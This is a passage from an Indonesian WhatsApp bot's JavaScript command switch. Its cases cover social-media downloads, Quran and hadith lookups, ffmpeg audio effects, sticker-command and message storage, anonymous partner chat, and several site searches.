                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) hisoka.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    hisoka.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.img, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.result.lagu}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Album : ${anu.result.album}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Singer : ${anu.result.penyanyi}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Publish : ${anu.result.publish}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Lirik :\n${anu.result.lirik.result}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.thumb, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.result.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${isUrl(text)[0]}`)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.title}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${anu.author.name}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Like : ${anu.like}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Caption : ${anu.caption}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: hisoka.user.name,
			buttons,
			headerType: 4
		    }
		    hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        hisoka.sendMessage(m.chat, { image: { url }, caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${anu.author.name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Like : ${anu.like}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		hisoka.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		hisoka.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		hisoka.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		hisoka.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                hisoka.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (!isCreator) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                hisoka.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                hisoka.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                hisoka.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await hisoka.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, hisoka.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, hisoka.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await hisoka.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await hisoka.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, hisoka.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, hisoka.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) return
                hisoka.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) return
                hisoka.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                hisoka.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Name : ${i.name}\n`
            teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Link : ${i.link}\n`
            teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Developer : ${i.developer}\n`
            teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title: ${judul}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Realease: ${rilis}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Size: ${ukuran}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Type: ${type}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Storage: ${storage}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Display: ${display}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Inchi: ${inchi}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Pixel: ${pixel}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Video Pixel: ${videoPixel}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ram: ${ram}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Chipset: ${chipset}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Battery: ${batrai}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Battery Brand: ${merek_batre}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Detail: ${detail}`
            hisoka.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title: ${i.title}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Thumbnail: ${i.thumb}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url: ${i.url}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            if (!isCreator) return
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title: ${i.title}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url: ${i.url}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Community: ${i.community}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Community Link: ${i.community_link}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Thumbnail: ${i.community_thumb}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Description: ${i.community_desc}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            hisoka.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Judul: ${judul}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Dibaca: ${dibaca}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Divote: ${divote}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Bab: ${bab}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Waktu: ${waktu}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url: ${url}\n`
            capt += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Deskripsi: ${description}`
